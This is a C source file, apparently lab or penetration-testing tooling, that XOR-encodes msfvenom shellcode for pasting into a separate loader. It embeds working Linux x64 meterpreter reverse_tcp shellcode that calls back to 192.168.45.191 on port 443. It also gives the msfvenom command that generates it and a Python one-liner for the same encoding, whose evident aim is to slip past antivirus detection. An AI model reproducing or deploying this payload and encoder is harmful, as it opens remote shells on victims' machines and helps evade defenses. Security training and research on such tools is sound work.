/*
================================================================
simpleXORencoder.c — XOR Shellcode Encoder Tool (Run on Kali)
================================================================
WHAT THIS DOES:
  A helper encoder utility that XOR-encodes a raw msfvenom shellcode
  payload with key 0xfa (decimal 250) and prints each encoded byte
  as \xNN to stdout.

  The printed output is what you paste into simpleLoader.c's buf[] array.
  This tool runs on your Kali machine — it is NOT the payload itself.

BEFORE YOU USE THIS — PASTE YOUR SHELLCODE:
  Replace the buf[] array in this file with your raw (un-encoded) msfvenom
  shellcode. The shellcode currently embedded is a placeholder.

  Generate your own raw shellcode on Kali:
    msfvenom -p linux/x64/meterpreter/reverse_tcp \
      LHOST=<YOUR_KALI_IP> LPORT=443 -f c
  Copy the byte string output and paste it into buf[] below.

COMPILE (on Kali):
  gcc simpleXORencoder.c -o simpleXORencoder

RUN:
  ./simpleXORencoder

  Output looks like:
    XOR payload (key 0xfa):
    \x6A\xE5\x90\x19\x6A\x02...

  Copy all the \xNN bytes and paste them into simpleLoader.c's buf[] as:
    unsigned char buf[] = "\x6A\xE5\x90\x19\x6A\x02...";

ALTERNATIVE — ENCODE WITHOUT COMPILING (pure Python on Kali):
  python3 -c "
  data = open('shell.bin','rb').read()
  print(''.join(f'\\\\x{b ^ 0xfa:02X}' for b in data))
  "

BEFORE USING, CHANGE:
  - buf[] -> your raw msfvenom shellcode (NOT pre-encoded)
  - The LHOST and LPORT are baked into the shellcode during msfvenom generation
================================================================
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc simpleXORencoder.c -o simpleXORencoder

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.191 LPORT=443 -f c
unsigned char buf[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x01\xbb\xc0\xa8\x2d\xbf\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        printf("XOR payload (key 0xfa):\n");

        for(int i=0; i<buf_len; i++)
        {
                printf("\\x%02X",buf[i]^key);
        }

        return 0;
}